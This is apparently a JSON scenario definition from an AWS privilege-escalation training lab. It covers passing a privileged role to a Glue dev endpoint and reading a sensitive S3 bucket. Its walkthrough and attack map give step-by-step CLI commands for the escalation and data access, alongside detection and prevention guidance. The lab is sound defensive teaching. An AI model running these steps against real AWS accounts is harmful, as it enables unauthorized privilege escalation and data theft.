{
  "displayName": "Glue Dev Endpoint Creation to Bucket",
  "name": "glue-001-iam-passrole+glue-createdevendpoint",
  "description": "Pass privileged role to AWS Glue dev endpoint and access S3 buckets via SSH",
  "costEstimate": "$0/mo",
  "pathfindingCloudId": "glue-001",
  "interactiveDemo": false,
  "category": "Privilege Escalation",
  "subCategory": "new-passrole",
  "pathType": "one-hop",
  "target": "to-bucket",
  "environments": [
    "prod"
  ],
  "attackPath": {
    "principals": [],
    "summary": ""
  },
  "mitreAttack": {
    "tactics": [
      "TA0004 - Privilege Escalation"
    ],
    "techniques": [
      "T1098.001 - Account Manipulation: Additional Cloud Credentials",
      "T1578 - Modify Cloud Compute Infrastructure"
    ]
  },
  "terraform": {
    "variableName": "enable_single_account_privesc_one_hop_to_bucket_glue_001_iam_passrole_glue_createdevendpoint",
    "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-bucket/glue-001-iam-passrole+glue-createdevendpoint"
  },
  "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-bucket/glue-001-iam-passrole+glue-createdevendpoint",
  "schemaVersion": "4.0.0",
  "permissions": {
    "required": [
      {
        "permission": "iam:PassRole",
        "principal": "pl-prod-glue-001-to-bucket-starting-user",
        "resource": "arn:aws:iam::*:role/pl-prod-glue-001-to-bucket-target-role",
        "description": "allows passing the target role to Glue"
      },
      {
        "permission": "glue:CreateDevEndpoint",
        "principal": "pl-prod-glue-001-to-bucket-starting-user",
        "resource": "*",
        "description": "allows creating a Glue development endpoint that assumes the passed role"
      }
    ],
    "helpful": [
      {
        "permission": "glue:GetDevEndpoint",
        "principal": "pl-prod-glue-001-to-bucket-starting-user",
        "purpose": "check endpoint status and retrieve SSH connection details"
      },
      {
        "permission": "iam:ListRoles",
        "principal": "pl-prod-glue-001-to-bucket-starting-user",
        "purpose": "discover available privileged roles to pass to Glue"
      },
      {
        "permission": "s3:ListBuckets",
        "principal": "pl-prod-glue-001-to-bucket-starting-user",
        "purpose": "discover target buckets after escalation"
      },
      {
        "permission": "glue:DeleteDevEndpoint",
        "principal": "pl-prod-glue-001-to-bucket-starting-user",
        "purpose": "clean up created endpoints after demonstration"
      }
    ]
  },
  "readme": {
    "objective": "Your objective is to learn how to exploit a privilege escalation vulnerability that allows you to move from the `pl-prod-glue-001-to-bucket-starting-user` IAM user to the `pl-sensitive-data-glue-001-{account_id}-{suffix}` S3 bucket by passing a privileged IAM role to a newly created AWS Glue development endpoint and SSHing into that endpoint to execute S3 commands with the role's credentials.\n\n- **Start:** `arn:aws:iam::{account_id}:user/pl-prod-glue-001-to-bucket-starting-user`\n- **Destination resource:** `arn:aws:s3:::pl-sensitive-data-glue-001-{account_id}-{suffix}`",
    "setup": {
      "prerequisites": "1. Install the `plabs` CLI:\n   ```bash\n   brew install pathfinding-labs/tap/plabs\n   ```\n2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)",
      "deployNonInteractive": "```bash\nplabs enable enable_single_account_privesc_one_hop_to_bucket_glue_001_iam_passrole_glue_createdevendpoint\nplabs apply\n```",
      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to enable it\n4. Press `d` to deploy"
    },
    "attack": {
      "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::{account_id}:user/pl-prod-glue-001-to-bucket-starting-user` | Scenario-specific starting user with access keys |\n| `arn:aws:iam::{account_id}:policy/pl-prod-glue-001-to-bucket-starting-policy` | Allows `iam:PassRole` and `glue:CreateDevEndpoint` |\n| `arn:aws:iam::{account_id}:role/pl-prod-glue-001-to-bucket-target-role` | Target role with S3 bucket read permissions |\n| `arn:aws:iam::{account_id}:policy/pl-prod-glue-001-to-bucket-target-policy` | Grants `s3:GetObject` and `s3:ListBucket` on sensitive bucket |\n| `arn:aws:s3:::pl-sensitive-data-glue-001-{account_id}-{suffix}` | Target sensitive S3 bucket containing sample data |",
      "demoAttack": {
        "executing": "The script will:\n1. Display a step-by-step walkthrough with color-coded output\n2. Generate an SSH key pair for endpoint access\n3. Create a Glue development endpoint with the target role\n4. Wait for the endpoint to become ready (5-10 minutes)\n5. SSH into the endpoint and execute AWS S3 commands\n6. Verify successful access to the sensitive S3 bucket\n7. Automatically delete the endpoint and clean up resources\n8. Output standardized test results for automation\n\n**Note:** Glue development endpoints cost approximately $2.20/hour while running. The script automatically cleans up the endpoint after demonstration. If the script is interrupted, manually delete the endpoint using `aws glue delete-dev-endpoint --endpoint-name pl-prod-gcd-escalation-endpoint`.",
        "resourcesCreated": "- Glue development endpoint (`pl-prod-gcd-escalation-endpoint`)\n- Generated SSH key pair files (`/tmp/pl-glue-001-demo-key` and `/tmp/pl-glue-001-demo-key.pub`)",
        "nonInteractive": "```bash\nplabs demo --list\nplabs demo glue-001-iam-passrole+glue-createdevendpoint\n```",
        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `r` to run the demo script"
      },
      "cleanup": {
        "nonInteractive": "```bash\nplabs cleanup --list\nplabs cleanup glue-001-iam-passrole+glue-createdevendpoint\n```",
        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `c` to run the cleanup script"
      }
    },
    "teardown": {
      "nonInteractive": "```bash\nplabs disable enable_single_account_privesc_one_hop_to_bucket_glue_001_iam_passrole_glue_createdevendpoint\nplabs apply\n```",
      "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
    },
    "defend": {
      "cspm": {
        "whatToDetect": "- **Overly Permissive PassRole**: User/role has `iam:PassRole` permission on roles with sensitive permissions\n- **Glue Service Escalation Path**: Combination of `iam:PassRole` and `glue:CreateDevEndpoint` that could lead to privilege escalation\n- **Privileged Role for Glue**: IAM roles with S3 or admin permissions that can be passed to Glue services\n- **Unrestricted Glue Access**: Principals with `glue:CreateDevEndpoint` without resource or condition constraints\n- **S3 Access via Compute Services**: Detection of privilege escalation paths where compute services (Glue, Lambda, EC2) can access sensitive S3 buckets",
        "prevention": "- **Restrict PassRole permissions**: Use resource-level conditions to limit which roles can be passed to Glue services:\n  ```json\n  {\n    \"Effect\": \"Allow\",\n    \"Action\": \"iam:PassRole\",\n    \"Resource\": \"arn:aws:iam::*:role/GlueServiceRole-*\",\n    \"Condition\": {\n      \"StringEquals\": {\n        \"iam:PassedToService\": \"glue.amazonaws.com\"\n      }\n    }\n  }\n  ```\n\n- **Implement SCPs**: Use Service Control Policies to prevent creation of Glue dev endpoints in production accounts:\n  ```json\n  {\n    \"Effect\": \"Deny\",\n    \"Action\": \"glue:CreateDevEndpoint\",\n    \"Resource\": \"*\"\n  }\n  ```\n\n- **Minimize Glue role permissions**: Ensure roles used by Glue dev endpoints follow least privilege principles and avoid S3 or admin access\n\n- **Use IAM Access Analyzer**: Regularly scan for privilege escalation paths involving PassRole and Glue services\n\n- **Require MFA**: Enforce MFA for creating Glue dev endpoints or passing roles to AWS services\n\n- **Network restrictions**: Configure VPC endpoints and security groups to limit SSH access to Glue dev endpoints from trusted networks only\n\n- **Consider alternatives**: For production environments, prefer AWS Glue jobs or notebooks with appropriate IAM roles instead of persistent dev endpoints"
      },
      "cloudSiem": {
        "cloudTrailEvents": "- `IAM: PassRole` -- Role passed to Glue service principal; high severity when the passed role has S3 or admin permissions\n- `Glue: CreateDevEndpoint` -- New Glue development endpoint created; critical when combined with a privileged role\n- `Glue: GetDevEndpoint` -- Endpoint status queried; may indicate attacker polling for readiness\n- `STS: AssumeRole` -- Role assumed by Glue service principal (`glue.amazonaws.com`); indicates endpoint is using the passed role\n- `S3: GetObject` -- Objects retrieved from S3; high severity when the calling principal is a Glue endpoint role",
        "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
      }
    },
    "guidedWalkthrough": "# Guided Walkthrough: Privilege Escalation via iam:PassRole + glue:CreateDevEndpoint\n\nThis scenario demonstrates a privilege escalation vulnerability where a user has permissions to pass a role to AWS Glue (`iam:PassRole`) and create Glue development endpoints (`glue:CreateDevEndpoint`). By creating a development endpoint with a role that has S3 bucket access, an attacker can SSH into the endpoint and execute AWS CLI commands with the elevated permissions of the passed role.\n\nAWS Glue development endpoints are interactive compute environments used for developing, testing, and debugging ETL scripts. When a development endpoint is created, it assumes the specified IAM role and makes those credentials available within the endpoint environment. An attacker who can SSH into the endpoint inherits these elevated permissions without needing to know the role's credentials directly.\n\nThis attack is particularly dangerous because Glue dev endpoints provide a persistent compute environment with internet connectivity, SSH access, and the ability to install arbitrary tools. Unlike ephemeral Lambda functions, dev endpoints remain running until explicitly deleted, giving attackers extended time to explore and exfiltrate data.\n\n**Important Note:** Glue development endpoints only support Glue versions **0.9** and **1.0** (legacy versions). Newer Glue versions (2.0, 3.0, 4.0) are not supported for dev endpoints. This scenario uses Glue 1.0.\n\n**Cost Warning:** This scenario creates a Glue development endpoint that costs approximately $2.20/hour while running (using minimum 2 node configuration). The demo script automatically cleans up the endpoint after demonstration, but if the script fails or is interrupted, you may incur ongoing charges until the endpoint is manually deleted. Always verify cleanup completion using `aws glue get-dev-endpoint`.\n\n## The Challenge\n\nYou start as `pl-prod-glue-001-to-bucket-starting-user`, an IAM user with two key permissions: `iam:PassRole` on `pl-prod-glue-001-to-bucket-target-role`, and `glue:CreateDevEndpoint`. The target role has `s3:GetObject` and `s3:ListBucket` on the sensitive bucket `pl-sensitive-data-glue-001-{account_id}-{suffix}`.\n\nYour goal is to read the contents of that S3 bucket. You cannot access the bucket directly as the starting user -- that permission lives on the target role. You need to find a way to act as that role.\n\n## Reconnaissance\n\nFirst, confirm your identity and verify you cannot access the target bucket directly:\n\n```bash\naws sts get-caller-identity\n# Should show pl-prod-glue-001-to-bucket-starting-user\n\naws s3 ls s3://pl-sensitive-data-glue-001-{account_id}-{suffix}\n# Should return Access Denied\n```\n\nNow look at what permissions you actually have. You can pass a role to Glue and create dev endpoints -- that's your path forward. Let's find out what roles you can pass:\n\n```bash\naws iam list-roles --query 'Roles[?contains(RoleName, `glue-001`)].RoleName'\n```\n\nYou'll see `pl-prod-glue-001-to-bucket-target-role`. That's the role with S3 access. The plan is clear: create a Glue dev endpoint, pass it that role, and then SSH in to run AWS CLI commands with the role's credentials.\n\n## Exploitation\n\n### Step 1: Generate an SSH Key Pair\n\nGlue dev endpoints require an SSH public key for authentication. Generate a throwaway key pair:\n\n```bash\nssh-keygen -t rsa -b 2048 -f /tmp/glue_key -N \"\"\n```\n\n### Step 2: Create the Glue Dev Endpoint\n\nNow create the dev endpoint, passing the target role and your SSH public key:\n\n```bash\nACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)\n\naws glue create-dev-endpoint \\\n  --endpoint-name pl-glue-001-demo-endpoint \\\n  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-glue-001-to-bucket-target-role \\\n  --public-key \"$(cat /tmp/glue_key.pub)\" \\\n  --glue-version \"1.0\" \\\n  --number-of-nodes 2 \\\n  --region us-east-1\n```\n\nThis is the exploitation step. AWS accepts the request because your user has `iam:PassRole` on the target role and `glue:CreateDevEndpoint`. Glue will provision a compute cluster and assume the target role automatically.\n\n### Step 3: Wait for the Endpoint to Become Ready\n\nProvisioning takes 5-10 minutes. Poll the status:\n\n```bash\nwhile true; do\n  STATUS=$(aws glue get-dev-endpoint \\\n    --endpoint-name pl-glue-001-demo-endpoint \\\n    --query 'DevEndpoint.Status' \\\n    --output text)\n  echo \"Status: $STATUS\"\n  [ \"$STATUS\" = \"READY\" ] && break\n  sleep 30\ndone\n```\n\n### Step 4: Retrieve the Endpoint's Public Address\n\nOnce the endpoint is `READY`, get its public SSH address:\n\n```bash\naws glue get-dev-endpoint \\\n  --endpoint-name pl-glue-001-demo-endpoint \\\n  --query 'DevEndpoint.PublicAddress' \\\n  --output text\n```\n\n### Step 5: SSH In and Access the Bucket\n\nNow SSH into the endpoint as the `glue` user:\n\n```bash\nssh -i /tmp/glue_key \\\n  -o StrictHostKeyChecking=no \\\n  glue@<PublicAddress>\n```\n\nOnce inside, confirm which role the endpoint is running as, then access the target bucket:\n\n```bash\n# Inside the endpoint SSH session:\naws sts get-caller-identity\n# Should show pl-prod-glue-001-to-bucket-target-role\n\naws s3 ls s3://pl-sensitive-data-glue-001-{account_id}-{suffix}/\n\naws s3 cp s3://pl-sensitive-data-glue-001-{account_id}-{suffix}/sensitive-data.txt -\n```\n\nYou now have full read access to the sensitive bucket -- using the target role's credentials running inside the Glue endpoint you created.\n\n## Verification\n\nFrom inside the SSH session, `aws sts get-caller-identity` should confirm you are operating as `pl-prod-glue-001-to-bucket-target-role`, not the starting user. The `aws s3 ls` and `aws s3 cp` commands should succeed and return the bucket's contents.\n\n## What Happened\n\nYou exploited the combination of `iam:PassRole` and `glue:CreateDevEndpoint` to spin up a persistent compute environment that assumed a privileged IAM role on your behalf. The Glue service accepted the role because AWS trusts the `glue.amazonaws.com` service principal, and your starting user had explicit permission to pass that role to Glue.\n\nThis pattern appears in real environments when developers are granted broad Glue permissions to build ETL pipelines. The `iam:PassRole` permission is often granted too broadly, allowing any role to be passed rather than only roles intended for Glue use. Because dev endpoints persist until explicitly deleted and expose a public SSH interface, an attacker can maintain access for an extended period -- significantly longer than the ephemeral access provided by Lambda invocations or ECS tasks.\n"
  },
  "attackMap": {
    "nodes": [
      {
        "id": "starting-principal",
        "label": "Starting User",
        "type": "principal",
        "subType": "iam-user",
        "arn": "arn:aws:iam::{account_id}:user/pl-prod-glue-001-to-bucket-starting-user",
        "description": "You have gained access to this principal's AWS IAM credentials. These could have been obtained through many real-world vectors: phishing a developer and gaining access to their workstation, compromising a browser session, exploiting a vulnerable workload running in this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.\nRegardless of how you obtained them, you are now operating as this principal. This IAM user has iam:PassRole permission on the target role and glue:CreateDevEndpoint permission, allowing them to create a Glue development endpoint that assumes a privileged role with S3 bucket access.\n"
      },
      {
        "id": "glue-endpoint",
        "label": "Glue Dev Endpoint",
        "type": "resource",
        "subType": "glue-job",
        "arn": "arn:aws:glue:{region}:{account_id}:devEndpoint/pl-glue-001-demo-endpoint",
        "description": "This AWS Glue development endpoint is created by the attacker and configured to assume the target IAM role. Once provisioned, it exposes an SSH interface where AWS credentials for the assumed role are available in the environment. The attacker can SSH into this endpoint and execute arbitrary AWS CLI commands with the permissions of the passed role.\n"
      },
      {
        "id": "target-role",
        "label": "Target Role",
        "type": "principal",
        "subType": "iam-role",
        "arn": "arn:aws:iam::{account_id}:role/pl-prod-glue-001-to-bucket-target-role",
        "description": "This IAM role is passed to the Glue development endpoint at creation time. Once the endpoint is provisioned and you SSH in, you are operating with this role's credentials. The role has s3:GetObject and s3:ListBucket permissions on the sensitive S3 bucket.\n"
      },
      {
        "id": "target-bucket",
        "label": "Sensitive S3 Bucket",
        "type": "resource",
        "subType": "s3-bucket",
        "isTarget": true,
        "arn": "arn:aws:s3:::pl-sensitive-data-glue-001-{account_id}-{suffix}",
        "description": "This S3 bucket contains sensitive data and is the final target of the attack. The target IAM role assumed by the Glue endpoint has s3:GetObject and s3:ListBucket permissions on this bucket, allowing the attacker to list and download all objects.\n"
      }
    ],
    "edges": [
      {
        "from": "starting-principal",
        "to": "glue-endpoint",
        "label": "iam:PassRole + glue:CreateDevEndpoint",
        "description": "The starting user passes the target role to a newly created Glue development endpoint. The endpoint assumes the role on creation and makes those credentials available via SSH.\n",
        "hints": [
          "Start by confirming your identity and verifying you cannot access the target bucket directly.",
          "Look at the policies attached to this user -- you have permissions to interact with the Glue service and to pass a role to it.",
          "Use iam:ListRoles to discover what roles exist and which ones trust the glue.amazonaws.com service principal.",
          "Glue development endpoints assume an IAM role at creation time and expose that role's credentials via an SSH interface -- you can pass the target role here.",
          "You will need to generate an SSH key pair before creating the endpoint; the public key is required by glue:CreateDevEndpoint.",
          "Provisioning takes 5-10 minutes -- use glue:GetDevEndpoint to poll for READY status before attempting to connect.",
          "Browse to https://pathfinding.cloud/paths/glue-001 for technique details."
        ],
        "commands": [
          {
            "description": "Generate an SSH key pair for endpoint authentication",
            "command": "ssh-keygen -t rsa -b 2048 -f /tmp/glue_key -N ''"
          },
          {
            "description": "Create the Glue development endpoint with the target role",
            "command": "aws glue create-dev-endpoint --endpoint-name pl-glue-001-demo-endpoint --role-arn arn:aws:iam::{account_id}:role/pl-prod-glue-001-to-bucket-target-role --public-key \"$(cat /tmp/glue_key.pub)\" --number-of-nodes 2 --glue-version 1.0"
          },
          {
            "description": "Poll until the endpoint status is READY (5-10 minutes)",
            "command": "aws glue get-dev-endpoint --endpoint-name pl-glue-001-demo-endpoint --query 'DevEndpoint.Status'"
          }
        ]
      },
      {
        "from": "glue-endpoint",
        "to": "target-role",
        "label": "SSH + IMDS credential retrieval",
        "description": "SSH into the Glue endpoint and retrieve the target role's temporary credentials. The credentials are available in the endpoint's environment because Glue assumed the role at creation time.\n",
        "hints": [
          "Once the endpoint is READY, retrieve the PublicAddress field from glue:GetDevEndpoint -- that is your SSH target.",
          "Connect as the glue user using your generated SSH key.",
          "Inside the endpoint, run aws sts get-caller-identity to confirm which role the environment is running as.",
          "The role credentials are already loaded into the environment -- you do not need to retrieve them from IMDS manually."
        ],
        "commands": [
          {
            "description": "Retrieve the endpoint's public SSH address",
            "command": "aws glue get-dev-endpoint --endpoint-name pl-glue-001-demo-endpoint --query 'DevEndpoint.PublicAddress' --output text"
          },
          {
            "description": "SSH into the endpoint as the glue user",
            "command": "ssh -i /tmp/glue_key -o StrictHostKeyChecking=no glue@<PublicAddress>"
          },
          {
            "description": "Confirm the identity of the assumed role",
            "command": "aws sts get-caller-identity"
          }
        ]
      },
      {
        "from": "target-role",
        "to": "target-bucket",
        "label": "s3:ListBucket + s3:GetObject",
        "description": "Use the target role's credentials to list and download objects from the sensitive S3 bucket.\n",
        "hints": [
          "You are now operating as the target role inside the endpoint -- check what S3 permissions this role has.",
          "Use aws s3 ls to discover what buckets are accessible from this role.",
          "The target bucket name follows the pattern pl-sensitive-data-glue-001-{account_id}-{suffix} -- use s3:ListBuckets to find the exact name.",
          "Use aws s3 cp to read the contents of objects in the bucket."
        ],
        "commands": [
          {
            "description": "List objects in the sensitive S3 bucket",
            "command": "aws s3 ls s3://pl-sensitive-data-glue-001-{account_id}-{suffix}/"
          },
          {
            "description": "Read sensitive data from the bucket",
            "command": "aws s3 cp s3://pl-sensitive-data-glue-001-{account_id}-{suffix}/sensitive-data.txt -"
          }
        ]
      }
    ]
  },
  "hasAttackMap": true,
  "slug": "glue-001-to-bucket"
}